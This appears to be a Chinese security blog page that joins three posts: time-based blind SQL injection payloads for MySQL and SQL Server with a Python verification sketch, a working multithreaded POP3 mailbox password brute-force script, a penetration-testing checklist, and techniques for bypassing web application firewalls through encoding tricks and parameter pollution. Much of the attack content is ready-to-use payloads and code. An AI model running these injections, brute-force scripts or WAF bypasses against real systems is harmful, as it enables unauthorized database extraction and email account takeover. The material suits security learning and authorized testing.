SQL注入练级攻略8-延时sql注入脚本

发表于 2015-09-18   |  

昨天找到个延时注入,sqlmap跑出来数据库类型,试了下sqlmap生成payload好使,就自己动手写一个脚本验证一下.
记录下实现过程:

实现逻辑

try:
    发送payload
    payload = "aaa';sleep(10)"
    conn = httplib.HTTPConnection(host,timeout = 5);
    conn.request(method="POST",url="目标",body=payload,headers=headers);
    conn.getresponse()
    conn.close()
expect:
    如果发现异常说明当前payload判断正确

MYSQL相关函数

在mysql中注入payload可能是这样的

aaa,;if(ascii(mid(lower(user()),1,1),sleep(8),0))=97

说明:
1.当前用户(user)小写(lower)第一个字母(mid)的ascii码(ascii)等于97时延时(sleep)8秒.
2.mid(p1,p2,p3) p1为字符串,p2为起始位置,p3长度
3.在python中可以使用ord(“s”)来对应小写字母s的ascii码

SQLSERVER相关函数

在sqlserver中payload可能是这样的

username=aa';if(ascii(substring(system_user,%d,1))=%d) begin WAITFOR DELAY '0:0:10' end--" % (i,ord(s))

说明:
1.当前用户(system_user)第i个字母(substring)的ascii码(ascii)等于小写字母s对应的ascii码(ord)时,延时(WAITFOR DELAY)10秒.
2.substring(p1,p2,p3) p1为字符串,p2为起始位置,p3长度,和mysql中的mid函数功能类似
3.ord是python内建函数,其他的函数是在目标数据库中执行的.

在这里记录一下脚本实现思路以及关于邮箱爆破的一些想法.

爆破脚本

#pop3协议,SMTP协议需要时候再补

import poplib

pop = poplib.POP3(host,port,delay)
print pop.getwelcome()  #如果连接成功打印welcome信息
pop = pop.user(username)
pop.pass_(password)     #到了这一步如果没有抛出异常,登录成功

注意:
1.在各个步骤的异常情况判断.
2.代码第6行如果第一次认证失败,不可以继续验证.需要调用quit方法结束实例(为什么解释器中和实际运行的结果不一致).
3.实现逻辑方面读取用户密码不断遍历实现暴力破解.

脚本代码

import threading, time, random, sys, poplib

success = []
def mailbruteforce(listuser,listpwd): 
  print "Bruting..."
  for user in listuser: 
    for value in listpwd : 
      user = user.replace("\n",suffix) 
      value = value.replace("\n","") 
      try: 
        pop = poplib.POP3(server,110,delay) 
        pop.user(user) 
        auth = pop.pass_(value) 
        print user,value,auth[1:3]
        success.append(user+':'+value)
        pop.quit() 
      except:
        pass
mailbruteforce(users,words)

安全测试思路总结

发表于 2015-09-14   |  

学习安全测试也有一段时间了,零零散散的学习了一些X站姿势,也结合前一阵的测试过程,做一个测试思路的总结.

信息搜集:

1.可以先用Nmap扫扫端口情况,换一换不同扫描策略看看结果.
2.用lijiejie的subdomainbrute.py查查子域名.
3.用dirfuzz.py爆破目录.
4.AppScan探测url备用.
5.可以利用登录或者找回密码等页面爆破网站注册用户.
6.根据域名查看域名注册人信息,IP反查,搜集旁站信息…
7.试试域传送漏洞.

总之就是尽可能的搜集信息,上面是能想到的比较重要的几点.在搜集过程中记录觉得有用的信息,例如:后台管理地址,企业邮箱入口.思路再猥琐一点,也可以搜集客服,HR或者其他一些公司公开人员信息,用于反射型XSS,CSRF,社工等用途.

账户体系检测

1.观察是否存在可爆破的页面,能否突破验证码,IP检测(通过修改X-Forwarded-For)等限制.
2.注册过程中可能出现的漏洞:任意手机注册,短信轰炸,越权绑定存在账户等问题,都需要进行排查.
2.修改密码功能,详情参考密码找回漏洞总结

SQL注入检测

1.将AppScan探测到的url存为txt文件.
2.使用sqlmap -m 参数进行批量扫描.
3.选取可疑url进行手工测试,尝试不同绕过.

XSS检测

1.使用chrome的XSS检测插件进行检测:将检测目标和payload添加至指定位置.
2.选取一些大范围使用以及可能造成存储型XSS的参数进行验证.
3.查看\”>&/等字符的过滤情况.

CSRF检测

1.截获请求,观察其中有无类似防止csrf攻击的参数.
2.修改refer继续请求.
3.如果请求被正常返回,构造csrf攻击页面,通过点击访问进行验证.

越权漏洞检测

1.注册两个账号,分别用chrome和火狐登录.
2.通过替换参数检测越权,通常是 id,uid,username等参数.
3.如果有条件同时检测平行越权和垂直越权.

历史漏洞排查

1.如果产品曾经爆出历史漏洞,可单独列出此项.
2.根据历史漏洞进行排查,验证修复情况.

工具扫描结果

1.AppScan 目前只用过这个,针对扫描结果进行验证,给出分析建议.
2.通常是一些敏感信息泄露:电话,邮箱,内网IP等
3.使用HTTPS协议,密码不能自动补全,httponly限制js操作cookie.

测试总结

1.列举测试过程中发现的问题,并简述修复建议.
2.简要评估网站安全.

SQL注入练级攻略(8)-绕过姿势(三)

发表于 2015-08-20   |   分类于 SLQ注入练级系列   |  

心得：waf存在于一个完整请求的各个部分，云waf，硬waf，软waf。现阶段可以理解为：我们请求的所有数据，都经过waf，由waf进行识别是否为合法请求。bypass的姿势就是要利用不同场景的特性构造一个不能被waf识别的有效请求，这个请求可能起作用于Web server\web程序\数据库等不同的地方。但是万变不离其中，本质就是寻找waf环境和系统环境间相同语句的不同解析结果

Web Server层的bypass

1.IIS服务器

  • % 特性
    场景：iis+asp
    说明：字符串se%lect在waf层解析出来是se%lect在asp+iis环境中是select

  • %u 特性
    场景：iis+asp,iis+aspx
    说明：iis支出unicode编码将关键字的某个字符以%u006c的格式输入在waf层会通过，在iis环境中解析为正常sql语句从而bypass。

  • 多个unicode码对应同一个字符
    场景：iss+asp
    说明：select中的e对应的unicode为%u0065，但是%u00f0同样会被转换成为e。

    s%u0065lect->select
    s%u00f0lect->select
    疑问:如何知道哪些unicode编码会被解码成相同的字符
    可以参考：wooyun知识库wafbypass-七个姿势

2.apache服务器

  • method绕过
    场景：某些版本的Apache
    说明：发生GET请求时，无论method取任何值，都返回200.
    具体参考
    安全宝SQL注入规则绕过

  • php和Apache畸形boundary绕过
    场景：php+Apach
    说明：Php在解析multipart-data的时候有自己的特性，对于boundary的识别，只取了逗号前面的内容，例如我们设置的boundary为—-aaaa,123456，php解析的时候只识别了—-aaaa,后面的内容均没有识别。然而其他的如WAF在做解析的时候，有可能获取的是整个字符串，此时可能就会出现BYPASS。

Web应用程序层bypass

1.url编码绕过
说明：在这一步waf可能会对url只进行一次解码，然后过滤。此时可以试一次url编码或两次url编码，不管怎么样在应用程序里，都需要对url进行完全解码，就是解到正常的语句，要不然还是无法继续执行的。
具体参考：
两次url编码绕过waf
2.改变请求获取方式

  • GET，POST，COOKIE
    说明：在有些环境下可能存在统一参数获取的情况，例如 p = select * from admin p可以从GET，POST或者COOKIE中，我们可以通过将注入语句变换位置从而实现绕过。
    也就是说，应用可以从这3种方式获取到t的内容，但是waf不一定会将这三种方式全部过滤
    具体参考
    变化payload位置绕过waf

  • POST提交方式变化
    POST提交数据有两种方式urlencode和form-data，当一种被过滤可以考虑换一种方式。

  • 畸形请求方式
    在asp和asp.net获取请求的时候使用了request包形如request[“q”]–(django下会不会存在?)它会分不清GET和POST请求，就可能出现问题，可能出现的问题就是发送一个畸形的请求包，waf没有正常拦截，但是却被正常解析
    畸形的请求包可能是声明method为GET，包的实际结构是POST形式
    具体参考
    asp.net中使用request方法获取参数造成bypass

3.hpp方式(HTTP参数污染)
正常?id=1
当我们发送?id=1&id=2&id=3形如此类的参数，不同的环境获取到的参数可能是不同的。

asp/asp.net + iss : id = 1,2,3
php+apache : id = 3

由此可见，waf获取的参数和应用程序获取到的参数也可能是不一样，具体情境具体分析，要搞清楚waf获取到的内容和应用获取到的内容的差异，才能准确构造payload。
这种方式的bypass可能进行一些白名单的绕过
id = admin&id = 1union select user from admin
admin是白名单中的内容，后面id内容是应用获取到的内容。这种情况就可能发生注入。
